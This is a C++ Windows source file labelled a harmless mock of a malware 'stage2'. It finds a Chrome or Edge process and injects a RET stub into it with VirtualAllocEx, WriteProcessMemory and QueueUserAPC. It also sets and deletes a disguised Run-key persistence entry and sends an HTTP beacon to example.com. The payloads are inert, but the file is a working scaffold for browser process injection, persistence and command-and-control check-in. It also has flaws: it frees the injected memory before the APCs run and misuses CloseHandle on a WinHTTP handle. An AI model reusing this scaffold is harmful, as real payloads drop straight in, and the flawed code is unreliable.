// stage2.cpp — HARMLESS mock. QueueUserAPC injection + persistence + beacon.

#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string>
#include <iostream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

// ---------- find a browser process ----------
DWORD FindBrowserPid() {
    const wchar_t* targets[] = { L"chrome.exe", L"msedge.exe" };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            for (auto t : targets) {
                if (_wcsicmp(pe.szExeFile, t) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            }
            if (pid) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// ---------- QueueUserAPC injection (RET stub, harmless) ----------
bool inject_apc() {
    DWORD pid = FindBrowserPid();
    if (!pid) {
        std::cout << "no browser found, skipping injection\n";
        return false;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return false;

    LPVOID remote = VirtualAllocEx(hProc, NULL, 0x1000,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) { CloseHandle(hProc); return false; }

    unsigned char stub[] = { 0xC3 }; // RET
    SIZE_T written = 0;
    WriteProcessMemory(hProc, remote, stub, sizeof(stub), &written);

    // QueueUserAPC — fires when any thread in the target next enters alertable wait.
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    if (QueueUserAPC((PAPCFUNC)remote, hThread, 0)) queued++;
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);

    VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
    CloseHandle(hProc);

    std::cout << "APC queued on " << queued << " threads in pid " << pid << "\n";
    return queued > 0;
}

// ---------- persistence (write then delete) ----------
void persist_mock() {
    HKEY hKey;
    const char* path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) return;
    RegSetValueExA(hKey, "WinCacheSvc", 0, REG_SZ,
                   (const BYTE*)"C:\\Windows\\System32\\notepad.exe", 32);
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_SET_VALUE, &hKey);
    RegDeleteValueA(hKey, "WinCacheSvc");
    RegCloseKey(hKey);
}

// ---------- beacon ----------
void beacon_mock() {
    HINTERNET s = WinHttpOpen(L"WinCache/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return;
    HINTERNET c = WinHttpConnect(s, L"example.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (c) {
        HINTERNET r = WinHttpOpenRequest(c, L"GET", L"/", NULL, WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (r) {
            WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                               WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            WinHttpReceiveResponse(r, NULL);
            CloseHandle(r);
        }
        WinHttpCloseHandle(c);
    }
    WinHttpCloseHandle(s);
}

int main() {
    std::cout << "stage2 running — APC injection test\n";

    bool ok = inject_apc();
    persist_mock();
    beacon_mock();

    std::cout << "injection: " << (ok ? "queued" : "skipped") << "\n";
    std::cout << "press enter to exit...\n";
    std::cin.get();
    return 0;
}
